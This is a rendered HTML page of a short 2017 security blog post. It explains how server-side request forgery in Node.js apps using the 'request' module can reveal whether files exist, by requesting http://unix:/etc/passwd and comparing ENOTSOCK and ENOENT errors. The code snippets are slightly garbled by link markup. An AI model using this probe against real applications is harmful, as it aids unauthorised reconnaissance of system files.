@@ -1,0 +1,333 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  
+  
+  
+  
+  
+  <link rel="prev" href="http://evilpacket.net/2017/npm-registry-spelunking-dependencies-referenced-by-url/" />
+  <link rel="next" href="http://evilpacket.net/2019/leveraging-javascript-debuggers/" />
+  <link rel="canonical" href="http://evilpacket.net/2017/enumerating-files-using-server-side-request-forgery-and-the-request-module/" />
+  <link rel='shortcut icon' type='image/x-icon' href='/favicon.ico' />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           Enumerating Files Using Server Side Request Forgery and the request Module | EvilPacket
+       
+  </title>
+  <meta name="title" content="Enumerating Files Using Server Side Request Forgery and the request Module | EvilPacket">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Enumerating Files Using Server Side Request Forgery and the request Module"/>
+<meta name="twitter:description" content="If you ever find Server Side Request Forgery (SSRF) in a node.js based application and the app is using the request module you can use a special url format to detect the existence of files / directories.
+While request does not support the file:// scheme it does supports a special url format to communicate with unix domain sockets and the errors returned from a file existing vs not existing are different."/>
+
+  <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Enumerating Files Using Server Side Request Forgery and the request Module",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http:\/\/evilpacket.net\/2017\/enumerating-files-using-server-side-request-forgery-and-the-request-module\/"
+  },
+  "image": {
+    "@type": "ImageObject",
+    "url": "http:\/\/evilpacket.net\/cover.png",
+    "width":  800 ,
+    "height":  600 
+  },
+  "genre": "posts",
+  
+  "wordcount":  272 ,
+  "url": "http:\/\/evilpacket.net\/2017\/enumerating-files-using-server-side-request-forgery-and-the-request-module\/",
+  "datePublished": "2017-12-15T09:02:16-08:00",
+  "dateModified": "2017-12-15T09:02:16-08:00",
+  
+  "publisher": {
+    "@type": "Organization",
+    "name": "Adam BValdwin",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http:\/\/evilpacket.net\/logo.png",
+      "width":  127 ,
+      "height":  40 
+    }
+  },
+  "author": {
+    "@type": "Person",
+    "name": "Adam Baldwin"
+  },
+  "description": ""
+}
+</script>
+</head>
+
+  
+
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="http://evilpacket.net/">EvilPacket</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/presentations" title="">Presentations</a>
+                
+                <a class="menu-item" href="/vulns" title="">Vulnerabilities</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+                <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-sun"></i></a>&nbsp;<a href="http://evilpacket.net/">EvilPacket</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog</a>
+                
+                <a class="menu-item" href="/presentations" title="">Presentations</a>
+                
+                <a class="menu-item" href="/vulns" title="">Vulnerabilities</a>
+                
+                <a class="menu-item" href="/about" title="">About</a>
+                
+        </div>
+    </div>
+</nav>
+
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp">
+    <header class="post-header">
+        <h1 class="post-title">Enumerating Files Using Server Side Request Forgery and the request Module</h1>
+        <div class="post-meta">
+            Written by <a href="http://evilpacket.net/" rel="author">Adam Baldwin</a> with ♥ 
+                <span class="post-time">
+                    on <time datetime=2017-12-15 >15 December 2017</time>
+                </span>
+                in
+                
+                <i class="iconfont icon-timer"></i>
+                2 min
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <p>If you ever find Server Side Request Forgery (SSRF) in a node.js based application and the app is using the request module you can use a special url format to detect the existence of files / directories.</p>
+<p>While request does not support the file:// scheme it does supports a special url format to <a href="https://www.npmjs.com/package/request#unix-domain-sockets">communicate with unix domain sockets</a> and the errors returned from a file existing vs not existing are different.</p>
+<p>The format looks like this. <a href="http://unix:SOCKET:PATH">http://unix:SOCKET:PATH</a> and for our purposes we can ignore PATH all together.</p>
+<p>Let’s take this code for example. We’re assuming that as a user we can somehow control the url.</p>
+<p><strong>File exists condition:</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">Request</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;request&#39;</span>)
+
+<span style="color:#a6e22e">Request</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;[http://unix:/etc/passwd&#39;</span>](<span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//unix:/etc/passwd&#39;), (err) =&gt; { 
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>) 
+})
+</code></pre></div><p>As /etc/password exists request will try and use it as a unix socket, of course it is not a unix socket so it will give a connection failure error.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">{ Error: connect **ENOTSOCK** /etc/passwd
+    at Object._errnoException (util.js:1024:11)
+    at _exceptionWithHostPort (util.js:1046:20)
+    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1182:14)
+  code: &#39;ENOTSOCK&#39;,
+  errno: &#39;ENOTSOCK&#39;,
+  syscall: &#39;connect&#39;,
+  address: &#39;/etc/passwd&#39; }
+</code></pre></div><p><strong>File does not exist condition:</strong></p>
+<p>Using the same code with a different file that does <em>not</em> exist.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">Request</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;request&#39;</span>)
+
+<span style="color:#a6e22e">Request</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;[http://unix:/does/not/exist&#39;</span>](<span style="color:#a6e22e">http</span><span style="color:#f92672">:</span><span style="color:#75715e">//unix:/etc/passwd&#39;), (err) =&gt; { 
+</span><span style="color:#75715e"></span>  <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">err</span>) 
+})
+</code></pre></div><p>The resulting error looks like this.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">{ Error: connect **ENOENT** /does/not/exist
+    at Object._errnoException (util.js:1024:11)
+    at _exceptionWithHostPort (util.js:1046:20)
+    at PipeConnectWrap.afterConnect [as oncomplete] (net.js:1182:14)
+  code: &#39;ENOENT&#39;,
+  errno: &#39;ENOENT&#39;,
+  syscall: &#39;connect&#39;,
+  address: &#39;/does/not/exist&#39; }
+</code></pre></div><p>The different is small: <strong>ENOTSOCK</strong>, vs <strong>ENOENT</strong></p>
+<p>While not that severe of an issue on its own it’s a trick that’s help me on past security assessments to enumerate file path locations. Maybe you’ll find it useful too.</p>
+<p>Originally posted <a href="https://medium.com/@adam_baldwin/enumerating-files-using-server-side-request-forgery-and-the-request-module-4b5d09a7b0e6">on Medium</a></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Adam Baldwin </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>272</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=http%3a%2f%2fevilpacket.net%2f2017%2fenumerating-files-using-server-side-request-forgery-and-the-request-module%2f&amp;text=Enumerating%20Files%20Using%20Server%20Side%20Request%20Forgery%20and%20the%20request%20Module&amp;via=adam_baldwin" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+        <a href="//www.facebook.com/sharer/sharer.php?u=http%3a%2f%2fevilpacket.net%2f2017%2fenumerating-files-using-server-side-request-forgery-and-the-request-module%2f" target="_blank" title="Share on Facebook">
+          <i class="iconfont icon-facebook"></i>
+        </a>
+        
+      
+      
+      
+      
+        <a href="//www.linkedin.com/shareArticle?url=http%3a%2f%2fevilpacket.net%2f2017%2fenumerating-files-using-server-side-request-forgery-and-the-request-module%2f&amp;title=Enumerating%20Files%20Using%20Server%20Side%20Request%20Forgery%20and%20the%20request%20Module" target="_blank" title="Share on LinkedIn">
+          <i class="iconfont icon-linkedin"></i>
+        </a>
+        
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+                
+            </p>
+
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="http://evilpacket.net/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="http://evilpacket.net/2017/npm-registry-spelunking-dependencies-referenced-by-url/" class="prev" rel="prev" title="npm Registry Spelunking: Dependencies Referenced by URL"><i class="iconfont icon-dajiantou"></i>&nbsp;npm Registry Spelunking: Dependencies Referenced by URL</a>
+         
+        
+        <a href="http://evilpacket.net/2019/leveraging-javascript-debuggers/" class="next" rel="next" title="Leveraging Javascript Debuggers for compromise">Leveraging Javascript Debuggers for compromise&nbsp;<i class="iconfont icon-xiaojiantou"></i></a>
+        
+    </div>
+
+    <div class="post-comment">
+          
+          
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2019 - 2020</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="http://evilpacket.net/">Adam Baldwin</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    
+    <script src="/js/vendor_no_gallery.min.js" async=""></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
